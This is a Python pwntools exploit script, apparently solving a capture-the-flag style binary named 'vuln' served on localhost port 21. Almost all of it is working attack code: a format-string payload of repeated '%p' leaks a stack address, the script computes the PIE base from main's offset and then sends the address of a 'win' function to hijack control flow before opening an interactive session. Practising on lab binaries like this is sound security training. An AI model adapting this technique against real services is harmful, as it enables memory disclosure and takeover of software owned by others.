#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln --host localhost --port 21
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 21)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, fam='ipv4')
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

FMT_STR_DISTANCE = 19
LEAK_PAYLOAD = '.'.join(['%p' for x in range(FMT_STR_DISTANCE)]).encode('latin1')
MAIN_LEAK_OFFSET = 65

io = start()

io.readuntil(b"Enter your name:")
io.info(f"leaking main+{MAIN_LEAK_OFFSET}...".encode('latin1'))
io.sendline(LEAK_PAYLOAD)

leak_addr = int(io.readline().split(b'.')[-1].strip().decode('latin1'), 16)
io.success(f"main+{MAIN_LEAK_OFFSET} = {hex(leak_addr)}".encode('latin1'))

pie_base = leak_addr - exe.symbols['main'] - MAIN_LEAK_OFFSET
log.success(f"pie_base = {hex(pie_base)}".encode('latin1'))
win_addr = pie_base + exe.symbols['win']
log.success(f"win_addr = {hex(win_addr)}".encode('latin1'))

io.sendline(hex(win_addr).encode('latin1'))

io.interactive()

